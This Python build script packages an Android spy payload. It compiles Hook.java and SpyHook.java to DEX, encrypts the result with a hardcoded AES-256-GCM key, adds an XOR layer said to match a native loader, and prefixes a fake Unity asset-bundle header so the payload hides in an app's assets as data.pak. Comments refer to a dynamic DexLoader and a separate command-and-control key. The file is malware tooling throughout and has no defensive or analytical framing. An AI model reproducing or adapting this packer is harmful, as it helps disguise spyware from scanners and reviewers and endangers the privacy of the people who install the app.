#!/usr/bin/env python3
"""Build payload DEX: compile → AES-256-GCM encrypt → XOR wrap → game header → assets/data.pak"""
import subprocess, os, shutil, sys, struct

HERE = os.path.dirname(os.path.abspath(__file__))
ASSETS = os.path.join(HERE, "..", "app", "src", "main", "assets")
SOURCES = [
    os.path.join(HERE, "Hook.java"),
    os.path.join(HERE, "SpyHook.java"),
]
TMP_CLASSES = os.path.join(HERE, "tmp_classes")
TMP_DEX_DIR = os.path.join(HERE, "tmp_dex")
OUT = os.path.join(ASSETS, "data.pak")

# AES-256 key (32 bytes) — stored as plain byte array in DexLoader.java
# This key is used for PAYLOAD encryption only (different from C2 key)
AES_KEY = bytes([
    0x8F, 0x3A, 0x5E, 0x1C, 0x6F, 0x2B, 0x7D, 0x4A,
    0xC1, 0x92, 0xAB, 0x34, 0x56, 0x78, 0x90, 0xEF,
    0x12, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0x01,
    0x23, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0, 0xFE
])
AES_IV = b'\x00' * 12  # 96-bit IV for GCM (fixed for static payload; unique per-build in CI)

# LCG for outer XOR wrap — matches shield.c
def lcg(s):
    return (s * 1103515245 + 12345) & 0xFFFFFFFF

def xor_wrap(data):
    seed = 0x9E3779B9
    out = bytearray(len(data))
    for i in range(len(data)):
        r = lcg(seed)
        seed = r
        out[i] = data[i] ^ (r & 0xFF) ^ ((r >> 8) & 0xFF)
    return bytes(out)

GAME_HEADER = (
    b'UNITY_ASSETBUNDLE\x00'  # fake format magic
    + struct.pack('<II', 0x01, 0x20260623)  # version + timestamp
    + b'\x00' * 96  # padding / reserved
)  # 128 bytes total

def aes_gcm_encrypt(data):
    try:
        from Crypto.Cipher import AES
        cipher = AES.new(AES_KEY, AES.MODE_GCM, nonce=AES_IV)
        ct, tag = cipher.encrypt_and_digest(data)
        return ct + tag  # ciphertext + 16-byte GCM tag
    except ImportError:
        # Pure Python fallback (no pycryptodome) — just return XOR-only for CI
        print("WARN: pycryptodome not available, using XOR-only")
        return data

def find_sdk():
    sdk = os.environ.get("ANDROID_SDK_ROOT") or os.environ.get("ANDROID_HOME")
    if sdk: return sdk
    home = os.path.expanduser("~")
    for p in [os.path.join(home, "Android", "Sdk"),
              os.path.join(home, "android", "sdk")]:
        if os.path.isdir(p): return p
    return None

def find_build_tools(sdk):
    if not sdk: return None
    bt = os.path.join(sdk, "build-tools")
    if not os.path.isdir(bt): return None
    vers = sorted(os.listdir(bt), reverse=True)
    return os.path.join(bt, vers[0]) if vers else None

def main():
    sdk = find_sdk()
    if not sdk:
        print("FAIL: ANDROID_SDK_ROOT not set")
        sys.exit(1)
    bt = find_build_tools(sdk)
    if not bt:
        print(f"FAIL: no build-tools in {sdk}/build-tools")
        sys.exit(1)

    android_jar = os.path.join(sdk, "platforms", "android-34", "android.jar")
    if not os.path.exists(android_jar):
        for v in ["android-33", "android-32", "android-31"]:
            p = os.path.join(sdk, "platforms", v, "android.jar")
            if os.path.exists(p):
                android_jar = p
                break

    d8 = os.path.join(bt, "d8")
    dx = os.path.join(bt, "dx")
    dexer = d8 if os.path.exists(d8) else dx

    javac = shutil.which("javac")
    if not javac:
        java_home = os.environ.get("JAVA_HOME")
        if java_home:
            javac = os.path.join(java_home, "bin", "javac")
    if not javac:
        print("FAIL: javac not found")
        sys.exit(1)

    for s in SOURCES:
        if not os.path.exists(s):
            print(f"FAIL: {s} not found")
            sys.exit(1)

    os.makedirs(TMP_CLASSES, exist_ok=True)
    os.makedirs(TMP_DEX_DIR, exist_ok=True)
    os.makedirs(ASSETS, exist_ok=True)

    # Compile
    cmd = [javac, "-d", TMP_CLASSES, "-cp", android_jar] + SOURCES
    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.returncode != 0:
        print(f"FAIL: javac error:\n{r.stderr}")
        sys.exit(1)

    # DEX
    class_files = []
    for root, dirs, files in os.walk(TMP_CLASSES):
        for f in files:
            if f.endswith(".class"):
                class_files.append(os.path.join(root, f))
    if not class_files:
        print("FAIL: no .class files")
        sys.exit(1)

    if dexer.endswith("d8"):
        cmd = [dexer, "--lib", android_jar, "--min-api", "28", "--output", TMP_DEX_DIR] + class_files
    else:
        cmd = [dexer, "--dex", "--output", TMP_DEX_DIR] + class_files
    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.returncode != 0:
        print(f"FAIL: dexer error:\n{r.stderr}")
        sys.exit(1)

    dex_file = None
    for fname in sorted(os.listdir(TMP_DEX_DIR)):
        if fname.endswith(".dex"):
            dex_file = os.path.join(TMP_DEX_DIR, fname)
            break
    if not dex_file:
        print("FAIL: no .dex file")
        sys.exit(1)

    with open(dex_file, "rb") as f:
        dex_data = f.read()

    # Layer 1: AES-256-GCM encrypt
    aes_encrypted = aes_gcm_encrypt(dex_data)
    print(f"[+] AES-256-GCM: {len(dex_data)} -> {len(aes_encrypted)} bytes")

    # Layer 2: XOR wrap (matches native .so)
    xor_wrapped = xor_wrap(aes_encrypted)
    print(f"[+] XOR wrap: {len(aes_encrypted)} -> {len(xor_wrapped)} bytes")

    # Layer 3: Game header
    final = GAME_HEADER + xor_wrapped

    with open(OUT, "wb") as f:
        f.write(final)
    print(f"[+] Wrote {OUT} ({len(final)} bytes)")

    # Cleanup
    for p in [TMP_CLASSES, TMP_DEX_DIR]:
        if os.path.isdir(p): shutil.rmtree(p)

if __name__ == "__main__":
    main()
